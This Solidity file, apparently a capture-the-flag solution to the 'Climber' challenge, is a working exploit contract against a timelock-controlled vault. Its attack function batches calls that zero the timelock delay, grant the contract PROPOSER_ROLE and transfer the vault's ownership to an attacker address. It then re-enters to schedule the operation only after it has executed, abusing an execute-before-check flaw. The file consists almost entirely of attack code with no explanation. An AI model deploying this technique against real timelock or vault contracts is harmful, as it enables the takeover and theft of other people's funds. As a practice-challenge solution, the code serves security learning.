// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

import "./ClimberVault.sol";
import "./ClimberTimelock.sol";

/**
 * @title ClimberAttackContract
 * @author Edoardo Ierina
 */
contract ClimberAttackContract {
    using Address for address;

    ClimberTimelock private immutable climberTimelock;
    ClimberVault private immutable climberVault;    
    
    constructor(address payable timelock, address vault) {
        climberTimelock = ClimberTimelock(timelock);
        climberVault = ClimberVault(vault);
    }

    function attack(address owner) external {

        uint8 arraySize = 4;    
        address[] memory targets = new address[](arraySize);
        uint256[] memory values = new uint256[](arraySize);
        bytes[] memory dataElements = new bytes[](arraySize);
        
        bytes memory delayData = abi.encodeWithSelector(climberTimelock.updateDelay.selector, uint64(0));        
        bytes memory roleData1 = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));        
        bytes memory roleData2 = abi.encodeWithSignature("transferOwnership(address)", owner);
        bytes memory attackData = abi.encodeWithSelector(this.attack.selector, owner);        
        
        targets[0] = address(climberTimelock);
        targets[1] = address(climberTimelock);
        targets[2] = address(climberVault);
        targets[3] = address(this);

        dataElements[0] = delayData;
        dataElements[1] = roleData1;
        dataElements[2] = roleData2;
        dataElements[3] = attackData;
        
        bytes32 salt = bytes32(0);

        if(msg.sender == address(climberTimelock)) {
            climberTimelock.schedule(targets, values, dataElements, salt);            
        } else {
            climberTimelock.execute(targets, values, dataElements, salt);
        }
    }
}
